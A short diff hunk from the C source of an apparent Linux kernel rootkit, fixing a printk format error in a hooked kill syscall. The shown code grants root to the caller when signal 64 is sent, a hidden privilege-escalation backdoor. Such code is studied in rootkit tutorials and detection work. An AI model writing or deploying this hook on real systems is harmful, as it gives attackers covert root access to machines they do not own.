@@ -26,7 +26,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs) {
     int sig = regs->si;
 
     if ( sig == 64 ) {
-        printk(KERN_INFO, "[!] Rootkit: Giving you root. Standby...\n");
+        printk(KERN_INFO "[!] Rootkit: Giving you root. Standby...\n");
         set_root();
         return 0;
     }
